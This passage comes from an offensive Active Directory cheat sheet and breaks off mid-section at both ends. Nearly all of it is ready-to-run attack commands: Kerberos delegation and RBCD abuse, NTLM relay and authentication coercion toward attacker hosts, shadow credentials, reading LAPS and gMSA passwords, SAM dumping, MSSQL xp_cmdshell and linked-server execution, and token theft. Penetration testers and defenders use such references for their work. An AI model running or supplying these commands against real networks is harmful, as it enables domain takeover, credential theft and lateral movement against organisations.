Rubeus.exe s4u /ticket:tgt.kirbi /impersonateuser:administrator /msdsspn:cifs/<target> /ptt

:: With AES key
Rubeus.exe s4u /user:<delegation-user> /aes256:<aes-key> /impersonateuser:administrator /msdsspn:cifs/<target> /ptt

:: Alternate service (if service not in list)
Rubeus.exe s4u /ticket:tgt.kirbi /impersonateuser:administrator /msdsspn:time/<target> /altservice:cifs,ldap,http /ptt
```

```bash
# Impacket S4U
impacket-getST -spn cifs/<target> -impersonate administrator <domain>/<delegation-user>:<password>
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass <domain>/administrator@<target>
```

### Resource-Based Constrained Delegation (RBCD)

```powershell
# Requirements: Write access to target's msDS-AllowedToActOnBehalfOfOtherIdentity

# Check for write permissions
Get-DomainObjectAcl -Identity <target-computer> | ? { $_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite' }

# Create new machine account (if MachineAccountQuota > 0)
New-MachineAccount -MachineAccount YOURPC -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)

# Or with PowerMad
Import-Module .\Powermad.ps1
New-MachineAccount -MachineAccount YOURPC -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)
```

```powershell
# Get SID of new machine account
$sid = (Get-ADComputer YOURPC).SID.Value

# Set RBCD
$SD = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$sid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Set-DomainObject -Identity <target-computer> -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# Verify
Get-DomainComputer <target-computer> -Properties msds-allowedtoactonbehalfofotheridentity
```

```cmd
:: Get machine account hash
Rubeus.exe hash /password:Password123! /user:YOURPC$ /domain:<domain>

:: S4U attack
Rubeus.exe s4u /user:YOURPC$ /rc4:<hash> /impersonateuser:administrator /msdsspn:cifs/<target> /ptt

:: Access target
dir \\<target>\C$
```

```bash
# Impacket RBCD
# Add RBCD
impacket-rbcd -delegate-from 'YOURPC$' -delegate-to '<target>$' -action write '<domain>/<user>:<password>'

# Get service ticket
impacket-getST -spn cifs/<target> -impersonate administrator '<domain>/YOURPC$:Password123!'

# Use ticket
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass <target>
```

---

## 23. NTLM Relay Attacks

### Capture & Relay Setup

```bash
# Start Responder (capture only, disable SMB/HTTP servers)
responder -I eth0 -v

# Start ntlmrelayx
ntlmrelayx.py -tf targets.txt -smb2support

# Relay to specific target
ntlmrelayx.py -t smb://<target> -smb2support

# Execute command
ntlmrelayx.py -t smb://<target> -smb2support -c "whoami"

# Dump SAM
ntlmrelayx.py -t smb://<target> -smb2support --sam

# Interactive shell
ntlmrelayx.py -t smb://<target> -smb2support -i
```

### Relay to LDAP

```bash
# Add user to group
ntlmrelayx.py -t ldap://<dc> -smb2support --escalate-user <controlled-user>

# Create machine account
ntlmrelayx.py -t ldap://<dc> -smb2support --add-computer YOURPC Password123!

# RBCD attack
ntlmrelayx.py -t ldap://<dc> -smb2support --delegate-access

# Dump domain info
ntlmrelayx.py -t ldap://<dc> -smb2support --dump-domain
```

### Relay to ADCS

```bash
# Relay to HTTP enrollment
ntlmrelayx.py -t http://<ca-server>/certsrv/certfnsh.asp -smb2support --adcs --template <template>
```

### Coercion Techniques

```bash
# PetitPotam (MS-EFSRPC)
python3 PetitPotam.py <attacker-ip> <target-ip>

# PrinterBug / SpoolSample (MS-RPRN)
python3 printerbug.py <domain>/<user>:<password>@<target> <attacker-ip>
SpoolSample.exe <target> <attacker>

# DFSCoerce (MS-DFSNM)
python3 dfscoerce.py -u <user> -p <password> -d <domain> <attacker-ip> <target-ip>

# ShadowCoerce (MS-FSRVP)
python3 shadowcoerce.py -u <user> -p <password> -d <domain> <attacker-ip> <target-ip>

# Coercer (all-in-one)
coercer -u <user> -p <password> -d <domain> -l <attacker-ip> -t <target-ip>
```

### WebDAV Coercion

```bash
# For relaying when SMB signing is enforced
# Coerce via WebDAV (HTTP-based)

# Start WebDAV server
wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous

# Trigger authentication
python3 PetitPotam.py <attacker>@80/test <target>
```

---

## 24. Shadow Credentials Attack

### Attack Overview

```powershell
# Requirements: Write access to msDS-KeyCredentialLink attribute
# Allows passwordless authentication via certificate

# Check for write permissions
Get-DomainObjectAcl -Identity <target-user> | ? { $_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite' }
```

### Exploitation

```cmd
:: Whisker - Add shadow credential
Whisker.exe add /target:<target-user>

:: Output provides certificate and Rubeus command
:: Rubeus.exe asktgt /user:<target-user> /certificate:<base64-cert> /password:"<password>" /ptt
```

```bash
# Certipy
certipy shadow auto -u <user>@<domain> -p <password> -account <target-user>

# PyWhisker
python3 pywhisker.py -d <domain> -u <user> -p <password> --target <target-user> --action add

# Use generated certificate
certipy auth -pfx <target>.pfx -dc-ip <dc-ip>
```

### Cleanup

```cmd
:: List shadow credentials
Whisker.exe list /target:<target-user>

:: Remove specific credential
Whisker.exe remove /target:<target-user> /deviceid:<device-id>

:: Clear all
Whisker.exe clear /target:<target-user>
```

---

## 25. LAPS Abuse

### Enumeration

```powershell
# Check if LAPS is enabled
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwdExpirationTime | Where-Object {$_."ms-Mcs-AdmPwdExpirationTime" -ne $null}

# Find users who can read LAPS passwords
Get-DomainObjectAcl -SearchBase "LDAP://CN=Computers,DC=domain,DC=local" | ? { $_.ObjectAceType -eq "ms-Mcs-AdmPwd" -and $_.ActiveDirectoryRights -match "ReadProperty" } | Select SecurityIdentifier

# Find computers with LAPS
Get-DomainComputer | Where-Object { $_."ms-Mcs-AdmPwdExpirationTime" -ne $null } | Select DnsHostName

# PowerView
Get-DomainComputer -Identity <target> -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime
```

### Read LAPS Password

```powershell
# Native AD module
Get-ADComputer -Identity <target> -Properties ms-Mcs-AdmPwd | Select-Object ms-Mcs-AdmPwd

# PowerView
Get-DomainComputer <target> -Properties ms-Mcs-AdmPwd

# LAPSToolkit
Get-LAPSComputers
Find-LAPSDelegatedGroups
```

```cmd
:: CrackMapExec
crackmapexec ldap <dc-ip> -u <user> -p <password> --module laps

:: NetExec
nxc ldap <dc-ip> -u <user> -p <password> -M laps
```

```bash
# Impacket
impacket-laps <domain>/<user>:<password>@<dc-ip>

# Specific computer
impacket-laps <domain>/<user>:<password>@<dc-ip> -computer <target>
```

### Windows LAPS (New)

```powershell
# Windows LAPS (Windows Server 2022+)
Get-LapsADPassword -Identity <target> -AsPlainText

# Attributes
# msLAPS-Password (encrypted JSON)
# msLAPS-PasswordExpirationTime
# msLAPS-EncryptedPassword
# msLAPS-EncryptedPasswordHistory
```

---

## 26. Group Managed Service Accounts (gMSA)

### Enumeration

```powershell
# Find gMSA accounts
Get-ADServiceAccount -Filter * -Properties PrincipalsAllowedToRetrieveManagedPassword

# Check who can retrieve password
Get-ADServiceAccount -Identity <gmsa-name> -Properties PrincipalsAllowedToRetrieveManagedPassword | Select PrincipalsAllowedToRetrieveManagedPassword

# PowerView
Get-DomainObject -LDAPFilter '(objectClass=msDS-GroupManagedServiceAccount)' | Select SamAccountName,msds-groupmsamembership
```

### Retrieve gMSA Password

```powershell
# DSInternals
Install-Module DSInternals
$gmsa = Get-ADServiceAccount -Identity <gmsa-name> -Properties msDS-ManagedPassword
$blob = $gmsa.'msDS-ManagedPassword'
$mp = ConvertFrom-ADManagedPasswordBlob $blob
$hash = ConvertTo-NTHash $mp.SecureCurrentPassword
```

```cmd
:: GMSAPasswordReader
GMSAPasswordReader.exe --accountname <gmsa-name>

:: gMSADumper
python3 gMSADumper.py -u <user> -p <password> -d <domain>
```

```bash
# NetExec
nxc ldap <dc-ip> -u <user> -p <password> --gmsa

# Impacket - ntlmrelayx (if you can relay to DC)
ntlmrelayx.py -t ldaps://<dc-ip> --dump-gmsa
```

### Use gMSA Account

```cmd
:: Pass-the-Hash with gMSA NTLM hash
impacket-psexec <domain>/<gmsa-name>$@<target> -hashes :<ntlm-hash>

:: Rubeus - Request TGT
Rubeus.exe asktgt /user:<gmsa-name>$ /rc4:<ntlm-hash> /ptt
```

---

## 27. MSSQL Attacks

### Enumeration

```cmd
:: Find SQL servers in domain
setspn -T <domain> -Q MSSQLSvc/*

:: PowerUpSQL
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain
Get-SQLInstanceBroadcast
Get-SQLServerInfo -Instance <target>
```

### Authentication

```bash
# Impacket
impacket-mssqlclient <domain>/<user>:<password>@<target>
impacket-mssqlclient <domain>/<user>@<target> -windows-auth

# With hash
impacket-mssqlclient <domain>/<user>@<target> -hashes :<ntlm-hash> -windows-auth
```

```powershell
# PowerUpSQL
Get-SQLQuery -Instance <target> -Query "SELECT @@version" -Username sa -Password <password>
```

### Command Execution

```sql
-- Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- Execute commands
EXEC xp_cmdshell 'whoami';

-- Disable when done
EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;
```

```bash
# Impacket - enable and execute
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
```

### Privilege Escalation

```sql
-- Check if user is sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin');

-- Impersonate another user
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;

-- Check impersonation permissions
SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE';

-- Check linked servers
SELECT * FROM sys.servers;
EXEC sp_linkedservers;
```

### Linked Server Exploitation

```sql
-- Query linked server
SELECT * FROM OPENQUERY("LINKEDSERVER", 'SELECT @@version');

-- Execute on linked server
EXEC ('xp_cmdshell ''whoami''') AT [LINKEDSERVER];

-- Chain through multiple links
EXEC ('EXEC (''xp_cmdshell ''''whoami'''''') AT [SECONDLINK]') AT [FIRSTLINK];
```

```powershell
# PowerUpSQL linked server crawl
Get-SQLServerLinkCrawl -Instance <target>
Get-SQLServerLinkCrawl -Instance <target> -Query "EXEC xp_cmdshell 'whoami'"
```

### File Operations

```sql
-- Read file
SELECT * FROM OPENROWSET(BULK 'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS Contents;

-- Write file (OLE)
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
DECLARE @OLE INT; DECLARE @FileID INT;
EXEC sp_OACreate 'Scripting.FileSystemObject', @OLE OUT;
EXEC sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'C:\Temp\test.txt', 8, 1;
EXEC sp_OAMethod @FileID, 'WriteLine', NULL, 'test content';
EXEC sp_OADestroy @FileID; EXEC sp_OADestroy @OLE;
```

### Capture NTLMv2 Hash

```sql
-- Force authentication to attacker SMB
EXEC xp_dirtree '\\<attacker>\share';
EXEC xp_fileexist '\\<attacker>\share\file';
EXEC xp_subdirs '\\<attacker>\share';

-- Capture with Responder
responder -I eth0 -v
```

---

## 28. Token Manipulation

### Token Enumeration

```powershell
# List available tokens (requires SeImpersonatePrivilege)
# Incognito (Meterpreter)
meterpreter > use incognito
meterpreter > list_tokens -u
meterpreter > list_tokens -g
```

```cmd
:: Tokenvator
Tokenvator.exe list
Tokenvator.exe g
